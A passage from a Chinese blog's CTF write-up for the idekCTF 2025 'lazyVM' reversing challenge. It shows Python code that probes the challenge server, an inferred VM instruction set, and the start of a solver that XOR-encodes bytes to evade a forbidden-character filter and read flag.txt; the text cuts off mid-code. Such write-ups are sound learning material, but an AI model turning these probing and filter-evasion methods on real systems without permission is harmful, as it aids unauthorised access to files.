<!DOCTYPE html><html lang="zh-CN"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="stylesheet" href="/_next/static/css/268aef745a7b3740.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/3bc7e8f21884ab46.css" crossorigin="" data-precedence="next"/><link rel="stylesheet" href="/_next/static/css/82b97b807ab55020.css" crossorigin="" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-56ee71d079d69944.js" crossorigin=""/><script src="/_next/static/chunks/fd9d1056-e278622fa62dc0bf.js" async="" crossorigin=""></script><script src="/_next/static/chunks/69-faab496ef6116e58.js" async="" crossorigin=""></script><script src="/_next/static/chunks/main-app-ed6799cd4e1df27b.js" async="" crossorigin=""></script><script src="/_next/static/chunks/457b8330-b5c9cf3fcf214847.js" async=""></script><script src="/_next/static/chunks/d3ac728e-0c798b3b8aa3bf53.js" async=""></script><script src="/_next/static/chunks/612-fa632c1349770315.js" async=""></script><script src="/_next/static/chunks/120-aab2c7424ca78adb.js" async=""></script><script src="/_next/static/chunks/842-dce450cd96773e9f.js" async=""></script><script src="/_next/static/chunks/app/(posts)/%5B...slug%5D/page-e9e759b7bbaf69d2.js" async=""></script><script src="/_next/static/chunks/250-0ef8476c0fa8ee24.js" async=""></script><script src="/_next/static/chunks/372-d4ef474e704f1afd.js" async=""></script><script src="/_next/static/chunks/app/(posts)/layout-e15e5287e741ad91.js" async=""></script><script src="/_next/static/chunks/app/layout-8f33aca7be8ff34b.js" async=""></script><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-45BYSZ6WPY"></script><title>idekCTF 2025 &amp; justCTF 2025 Writeup - 铃木的网络日记</title><link rel="canonical" href="https://1kuzus.github.io/25c/wp-idekctf-justctf-2025/"/><link rel="icon" href="/favicon.ico" type="image/x-icon"/><script>
window.dataLayer = window.dataLayer || [];
function gtag() {
    dataLayer.push(arguments);
}
gtag('js', new Date());
gtag('config', 'G-45BYSZ6WPY');
</script><script>const a=z=>h.getItem(z),b=(y,z)=>h.setItem(y,z),c=(y,z)=>document.documentElement.setAttribute(y,z),d='theme',e='dark',f='light',g='class',h=localStorage;a(d)!==e&&a(d)!==f&&b(d,f);a(d)===e?c(g,e):c(g,f);</script><script>
if (!Array.prototype.findLast) {
    Array.prototype.findLast = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return this[i];
        }
        return undefined;
    };
}
if (!Array.prototype.findLastIndex) {
    Array.prototype.findLastIndex = function (callback) {
        for (let i = this.length - 1; i >= 0; i--) {
            if (callback(this[i])) return i;
        }
        return -1;
    };
}
</script><script src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js" crossorigin="" noModule=""></script></head><body><div id="header"><div id="header-left-wrapper"><a href="/"><div id="header-logo-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1560 1560"><path fill="#00A8C4" d="M644 97h273l272 683H916z"></path><path fill="#30303C" d="M98 97h273l409 1024L1189 97h273L916 1462H644z"></path><path fill="#00F8FF" d="M98 1462 643 97h273L371 1462z"></path></svg></div></a></div><div id="header-right-wrapper"><button id="header-show-sidebar-button" class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024"><rect fill="#FCFCFC" x="100" y="148" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="448" width="824" height="128" rx="64"></rect><rect fill="#FCFCFC" x="100" y="748" width="824" height="128" rx="64"></rect></svg></button><button class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-dark-theme-icon"><path d="M525 939h-4a440 440 0 0 1-314-135 446 446 0 0 1-11-597A432 432 0 0 1 367 90a43 43 0 0 1 45 9 43 43 0 0 1 10 43 358 358 0 0 0 83 376 361 361 0 0 0 377 83 43 43 0 0 1 54 55 433 433 0 0 1-100 155 439 439 0 0 1-311 128z" fill="#FCFCFC"></path></svg><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-light-theme-icon"><path d="M512 61c13 0 25 8 30 20l28 68c11 29-5 62-36 73a66 66 0 0 1-22 3c-34 0-61-25-61-56 0-7 1-14 3-20l28-68c5-12 17-20 30-20zm0 902c-13 0-25-8-30-20l-28-68a53 53 0 0 1-3-20c0-31 27-56 61-56a66 66 0 0 1 22 3c31 11 47 44 36 73l-28 68c-5 12-17 20-30 20zm451-451c0 13-8 25-20 30l-68 28c-29 11-62-5-73-36a66 66 0 0 1-3-22c0-34 25-61 56-61 7 0 14 1 20 3l68 28c12 5 20 17 20 30zm-902 0c0-13 8-25 20-30l68-28a53 53 0 0 1 20-3c31 0 56 27 56 61a66 66 0 0 1-3 22 57 57 0 0 1-73 36l-68-28c-12-5-20-17-20-30zm132-319c10-9 24-12 35-7l68 28c29 13 41 47 26 77a66 66 0 0 1-13 18c-24 24-61 26-83 4a53 53 0 0 1-12-17l-28-68c-5-11-2-25 7-35zm638 638c-10 9-24 12-35 7l-68-28a53 53 0 0 1-17-12c-22-22-20-59 4-83a66 66 0 0 1 18-13c30-15 64-3 77 26l28 68c5 11 2 25-7 35zm0-638c9 10 12 24 7 35l-28 68a56 56 0 0 1-77 26 66 66 0 0 1-18-13c-24-24-26-61-4-83 5-5 11-9 17-12l68-28c11-5 25-2 35 7zM193 831c-9-10-12-24-7-35l28-68a53 53 0 0 1 12-17c22-22 59-20 83 4a66 66 0 0 1 13 18c15 30 3 64-26 77l-68 28c-11 5-25 2-35-7zm319-94a225 225 0 1 1 0-450 225 225 0 0 1 0 450z" fill="#FCFCFC"></path></svg></button><a href="https://github.com/1kuzus/1kuzus.github.io" target="_blank" rel="noreferrer"><div class="header-button-bg"><svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 1024 1024"><path d="M411 831c4-5 7-10 7-12v-70c-106 22-128-44-128-44-17-45-43-56-43-56-34-24 4-24 4-24 37 3 58 39 58 39 34 58 89 41 111 32 3-24 13-41 24-51-86-10-174-43-174-188 0-41 15-75 39-102-4-10-17-48 3-101 0 0 33-10 104 40 31-9 64-12 96-12s65 5 96 12c73-50 104-40 104-40 20 53 8 91 3 101 24 27 39 60 39 102 0 145-88 178-174 188 14 12 26 34 26 70v104c0 4 2 7 7 12 5 7 3 19-4 24-3 2-7 3-10 3H425c-10 0-17-6-17-17 0-5 2-8 3-10z" fill="#FCFCFC"></path></svg></div></a></div></div><div id="post-layout"><div id="main" class="center-wrapper"><div id="contents"><h4 id="contents-header">本页目录</h4></div><h1 class="x-post-title">idekCTF 2025 &amp; justCTF 2025 Writeup</h1><div class="post-meta"><code class="not-loaded">null likes<!-- --> · </code><code class="not-loaded">null views<!-- --> · </code><code>2025-08-06</code></div><!--$--><h2 class="x-h1">idekCTF/rev/lazyVM</h2><p class="x-p">题目不给代码，只说flag在<code class="x-inline-highlight">./flag.txt</code>，需要自己推出指令集，大概思路如下：</p><h3 class="x-h2">utils</h3><p class="x-p">封装一个带有失败重试的请求函数<code class="x-inline-highlight">send</code>：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">import</span> functools
<span class="token keyword">import</span> socket
<span class="token keyword">import</span> time


<span class="token keyword">def</span> <span class="token function">retry</span><span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">inner_decorator</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token decorator annotation punctuation">@functools<span class="token punctuation">.</span>wraps</span><span class="token punctuation">(</span>func<span class="token punctuation">)</span>
        <span class="token keyword">def</span> <span class="token function">wrapper</span><span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
            retries <span class="token operator">=</span> <span class="token number">0</span>
            <span class="token keyword">while</span> retries <span class="token operator">&lt;</span> max_retries<span class="token punctuation">:</span>
                <span class="token keyword">try</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> func<span class="token punctuation">(</span><span class="token operator">*</span>args<span class="token punctuation">)</span>
                <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
                    retries <span class="token operator">+=</span> <span class="token number">1</span>
                    time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>
            <span class="token keyword">return</span> <span class="token boolean">None</span>

        <span class="token keyword">return</span> wrapper

    <span class="token keyword">return</span> inner_decorator


<span class="token decorator annotation punctuation">@retry</span><span class="token punctuation">(</span>max_retries<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"latin1"</span><span class="token punctuation">)</span>
    <span class="token keyword">assert</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>payload<span class="token punctuation">,</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span>
    s <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"lazy-vm.chal.idek.team"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">)</span>
    result <span class="token operator">=</span> s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>
    s<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> result<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><h3 class="x-h2">枚举可用指令</h3><p class="x-p">一开始没什么思路所以给服务端发<code class="x-inline-highlight">0</code>~<code class="x-inline-highlight">255</code>的字节看看有什么回显，得到的信息是：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>"0": "Thanks for playing",
"1": "Thanks for playing",
"2": "reg index out of range",
"3": "reg index out of range",
"4": "reg index out of range",
"5": "reg index out of range",
"6": "reg index out of range",
"7": "Thanks for playing",
"8": "Unknown instruction at ip=0x1",
"9": "Unknown instruction at ip=0x0",
"10": "Unknown instruction at ip=0x0",
...
</code></pre></div><p class="x-p">说明<code class="x-inline-highlight">\x00</code>~<code class="x-inline-highlight">\x08</code>是有意义的指令；再后面就是<code class="x-inline-highlight">i</code>指令可以打印当前虚拟机的状态：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>============== REGISTER ==================
R0 = 0x0
R1 = 0x0
R2 = 0x0
R3 = 0x0
R4 = 0x0
R5 = 0x0
R6 = 0x0
R7 = 0x0
ip: 0x0
sp: 0x64
=================== STACK =====================
0x0
0x0
0x0
0x0
0x0
=================== MEMORY =====================
The pay is only $5. Too lazy to implement this
</code></pre></div><p class="x-p">同时<code class="x-inline-highlight">f</code><code class="x-inline-highlight">l</code><code class="x-inline-highlight">a</code><code class="x-inline-highlight">g</code>四个字符不能出现在输入指令序列中，后面需要绕过。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>Found a forbidden character. Exit</code></pre></div><h3 class="x-h2">推断指令语法</h3><p class="x-p">这一部分就比较有意思了，我测试了下面的输入的回显：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> challengeio <span class="token keyword">import</span> send

<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Instruction </span><span class="token interpolation"><span class="token punctuation">{</span>i<span class="token punctuation">}</span></span><span class="token string">:"</span></span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> opt <span class="token keyword">in</span> <span class="token punctuation">[</span><span class="token string">"\x00\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x04\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x08\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x00"</span><span class="token punctuation">,</span>
                <span class="token string">"\x04\x06\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x04\x99\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x06\x00"</span><span class="token punctuation">,</span> <span class="token string">"\x99\x99\x00"</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> opt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"latin1"</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>payload <span class="token operator">+</span> <span class="token string">b"\n"</span><span class="token punctuation">,</span> send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"========"</span><span class="token punctuation">)</span>

<span class="token triple-quoted-string string">"""
Instruction 0:
b'\x00\x00\x00\n' Thanks for playing
b'\x00\x04\x00\n' Thanks for playing
b'\x00\x08\x00\n' Thanks for playing
b'\x00\x99\x00\n' Thanks for playing
b'\x00\x04\x06\x00\n' Thanks for playing
b'\x00\x04\x99\x00\n' Thanks for playing
b'\x00\x99\x06\x00\n' Thanks for playing
b'\x00\x99\x99\x00\n' Thanks for playing
========
Instruction 1:
b'\x01\x00\x00\n' Thanks for playing
b'\x01\x04\x00\n' Thanks for playing
b'\x01\x08\x00\n' Thanks for playing
b'\x01\x99\x00\n' Thanks for playing
b'\x01\x04\x06\x00\n' Thanks for playing
b'\x01\x04\x99\x00\n' Unknown instruction at ip=0x2
b'\x01\x99\x06\x00\n' Thanks for playing
b'\x01\x99\x99\x00\n' Unknown instruction at ip=0x2
========
Instruction 2:
b'\x02\x00\x00\n' Thanks for playing
b'\x02\x04\x00\n' Thanks for playing
b'\x02\x08\x00\n' reg index out of range
b'\x02\x99\x00\n' reg index out of range
b'\x02\x04\x06\x00\n' Thanks for playing
b'\x02\x04\x99\x00\n' Unknown instruction at ip=0x2
b'\x02\x99\x06\x00\n' reg index out of range
b'\x02\x99\x99\x00\n' reg index out of range
========
Instruction 3:
b'\x03\x00\x00\n' Thanks for playing
b'\x03\x04\x00\n' Thanks for playing
b'\x03\x08\x00\n' reg index out of range
b'\x03\x99\x00\n' reg index out of range
b'\x03\x04\x06\x00\n' Thanks for playing
b'\x03\x04\x99\x00\n' Unknown instruction at ip=0x2
b'\x03\x99\x06\x00\n' reg index out of range
b'\x03\x99\x99\x00\n' reg index out of range
========
Instruction 4:
b'\x04\x00\x00\n' Thanks for playing
b'\x04\x04\x00\n' Thanks for playing
b'\x04\x08\x00\n' reg index out of range
b'\x04\x99\x00\n' reg index out of range
b'\x04\x04\x06\x00\n' Thanks for playing
b'\x04\x04\x99\x00\n' Unknown instruction at ip=0x2
b'\x04\x99\x06\x00\n' reg index out of range
b'\x04\x99\x99\x00\n' reg index out of range
========
Instruction 5:
b'\x05\x00\x00\n' Thanks for playing
b'\x05\x04\x00\n' Thanks for playing
b'\x05\x08\x00\n' reg index out of range
b'\x05\x99\x00\n' reg index out of range
b'\x05\x04\x06\x00\n' Thanks for playing
b'\x05\x04\x99\x00\n' Unknown instruction at ip=0x2
b'\x05\x99\x06\x00\n' reg index out of range
b'\x05\x99\x99\x00\n' reg index out of range
========
Instruction 6:
b'\x06\x00\x00\n' Unknown instruction at ip=0x3
b'\x06\x04\x00\n' Unknown instruction at ip=0x3
b'\x06\x08\x00\n' reg index out of range
b'\x06\x99\x00\n' reg index out of range
b'\x06\x04\x06\x00\n' Thanks for playing
b'\x06\x04\x99\x00\n' Thanks for playing
b'\x06\x99\x06\x00\n' reg index out of range
b'\x06\x99\x99\x00\n' reg index out of range
========
Instruction 7:
b'\x07\x00\x00\n' Unknown instruction at ip=0x3
b'\x07\x04\x00\n' Unknown instruction at ip=0x3
b'\x07\x08\x00\n' Unknown instruction at ip=0x3
b'\x07\x99\x00\n' Unknown instruction at ip=0x3
b'\x07\x04\x06\x00\n' Thanks for playing
b'\x07\x04\x99\x00\n' reg index out of range
b'\x07\x99\x06\x00\n' Thanks for playing
b'\x07\x99\x99\x00\n' reg index out of range
========
Instruction 8:
b'\x08\x00\x00\n' Thanks for playing
b'\x08\x04\x00\n' Unknown instruction at ip=0x3
b'\x08\x08\x00\n' Thanks for playing
b'\x08\x99\x00\n' Unknown instruction at ip=0x1
b'\x08\x04\x06\x00\n' Thanks for playing
b'\x08\x04\x99\x00\n' reg index out of range
b'\x08\x99\x06\x00\n' Unknown instruction at ip=0x1
b'\x08\x99\x99\x00\n' Unknown instruction at ip=0x1
========
Instruction 9:
b'\t\x00\x00\n' Unknown instruction at ip=0x0
b'\t\x04\x00\n' Unknown instruction at ip=0x0
b'\t\x08\x00\n' Unknown instruction at ip=0x0
b'\t\x99\x00\n' Unknown instruction at ip=0x0
b'\t\x04\x06\x00\n' Unknown instruction at ip=0x0
b'\t\x04\x99\x00\n' Unknown instruction at ip=0x0
b'\t\x99\x06\x00\n' Unknown instruction at ip=0x0
b'\t\x99\x99\x00\n' Unknown instruction at ip=0x0
========
"""</span>
</code></pre></div><p class="x-p">注意到枚举可用指令这一步有些指令回显是<code class="x-inline-highlight">reg index out of range</code>，说明有的指令的参数是寄存器编号。（实际上这里是把<code class="x-inline-highlight">&#92;n</code>当做了参数，<code class="x-inline-highlight">&#92;n</code>字节码是<code class="x-inline-highlight">\x0a</code>超过了寄存器数量所以报错了）</p><p class="x-p">这里已经意识到<code class="x-inline-highlight">\x00</code>可能是<code class="x-inline-highlight">halt</code>指令，所以构造的<code class="x-inline-highlight">8</code>个测试项都以<code class="x-inline-highlight">\x00</code>结尾。长度不同是考虑到可能有的指令接收两个参数，参数的值主要取小于等于<code class="x-inline-highlight">7</code>和大于<code class="x-inline-highlight">7</code>两种情况，为了测试哪些参数代表寄存器编号，哪些代表立即数。这些测试项的选取很主观，但也差不多够推断出指令集了。</p><p class="x-p">举几个例子：</p><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">\x00</code>回显均为<code class="x-inline-highlight">Thanks for playing</code>，显然是结束符；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">\x01</code>回显中没有<code class="x-inline-highlight">reg index out of range</code>，说明<code class="x-inline-highlight">\x01</code>的入参应该是立即数或地址；如果用<code class="x-inline-highlight">i</code>打印信息，会发现数据被写进栈了，因此可以判断<code class="x-inline-highlight">\x01</code>指令是<code class="x-inline-highlight">push (imm)</code>；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">\x02</code>和<code class="x-inline-highlight">\x03</code>的入参与寄存器编号有关，并且用<code class="x-inline-highlight">i</code>打印信息发现<code class="x-inline-highlight">sp</code>变了，判断分别是<code class="x-inline-highlight">pop (Rx)</code>和<code class="x-inline-highlight">push (Rx)</code>；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">\x06</code>和<code class="x-inline-highlight">\x07</code>，输入<code class="x-inline-highlight">\x06\x00\x00&#92;n</code>和<code class="x-inline-highlight">\x07\x00\x00&#92;n</code>都回显<code class="x-inline-highlight">Unknown instruction at ip=0x3</code>，说明取指取到了<code class="x-inline-highlight">&#92;n</code>，也就是这两个指令都需要两个操作数作为参数，从后几个测试项的报错可以看出<code class="x-inline-highlight">\x06</code>的第一个操作数是寄存器编号，而<code class="x-inline-highlight">\x07</code>的第二个操作数是寄存器编号；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p><code class="x-inline-highlight">\x08</code>从测试的回显来看是无操作数指令，发现当<code class="x-inline-highlight">R0</code>大于<code class="x-inline-highlight">4</code>时会报错<code class="x-inline-highlight">unknown syscall</code>，判断是<code class="x-inline-highlight">syscall</code>指令；</p></div></div><div class="x-uli"><div class="x-uli-marker"><div class="x-uli-marker-dot"></div></div><div class="x-uli-content-wrapper"><p>...</p></div></div><p class="x-p">推理过程没有写的特别细致（sorry），最终得到的指令集如下：</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Plain Text</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code>Instructions:

\x00: 0 opt(s),             halt
\x01: 1 opt(s), data        push (imm)
\x02: 1 opt(s), Rx          pop  (Rx)
\x03: 1 opt(s), Rx          push (Rx)
\x04: 1 opt(s), Rx          or   (Rx)       => R0 |= Rx
\x05: 1 opt(s), Rx          xor  (Rx)       => R0 ^= Rx
\x06: 2 opt(s), Rx, addr    load (Rx, data) => Rx = mem[addr]
\x07: 2 opt(s), addr, Rx    store(addr, Rx) => mem[addr] = Rx

\x08: 0 opt(s),             syscall
                            R0         R1     R2     R3
                            0: read   (fd,    addr,  size)
                            1: write  (fd,    addr,  size)
                            2: open   (path,  flags)
                            3: close  (fd)
</code></pre></div><h3 class="x-h2">读出flag</h3><p class="x-p">系统调用号和参数含义（从<code class="x-inline-highlight">R1</code>开始传）是一致于Linux的。拿flag的思路是利用运算指令绕过过滤，构造出<code class="x-inline-highlight">flag.txt</code>字符串，然后<code class="x-inline-highlight">open</code>文件，<code class="x-inline-highlight">read</code>内容到内存，最后用<code class="x-inline-highlight">write</code>输出。</p><div class="x-codeblock"><div class="x-codeblock-header"><div class="x-codeblock-header-language">Python</div><button class="x-codeblock-header-copy"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 1024 1024" class="svg-copy-icon"><path d="M337 138a27 27 0 0 0-27 27v78h377c50 0 92 41 92 91v377h78a28 28 0 0 0 27-28V166a28 28 0 0 0-27-27H337z m441 640v78c0 50-41 91-92 91H166a92 92 0 0 1-91-91V337c0-50 41-92 91-92h78V166c0-50 41-91 91-91h520c50 0 91 41 91 91v520c0 50-41 92-91 92h-78zM166 309a27 27 0 0 0-27 28v520c0 15 12 27 27 27h520a28 28 0 0 0 28-27V337a28 28 0 0 0-28-28H166z"></path></svg></button></div><pre><code><span class="token keyword">from</span> challengeio <span class="token keyword">import</span> send


<span class="token keyword">def</span> <span class="token function">store</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
    payload <span class="token operator">=</span> <span class="token string">b""</span>
    <span class="token keyword">for</span> offset<span class="token punctuation">,</span> ch <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">:</span>
        offset <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span>offset<span class="token punctuation">]</span><span class="token punctuation">)</span>
        <span class="token comment"># 'f','l','a','g' is forbidden</span>
        <span class="token keyword">if</span> ch <span class="token keyword">in</span> <span class="token string">"flag"</span><span class="token punctuation">:</span>
            ch_xor_0xff <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ch<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">0xFF</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x01"</span> <span class="token operator">+</span> ch_xor_0xff  <span class="token comment"># push(ch ^ 0xFF)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x00"</span>  <span class="token comment"># pop(R0)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x01\xff"</span>  <span class="token comment"># push(0xFF)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x02\x07"</span>  <span class="token comment"># pop(R7)</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x05\x07"</span>  <span class="token comment"># R0 ^= R7</span>
            payload <span class="token operator">+=</span> <span class="token string">b"\x07"</span> <span class="token operator">+</span> offset <span class="token operator">+</span> <span class="token string">b"\x00"</span>  <span class="token comment"># store(offset, R0)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
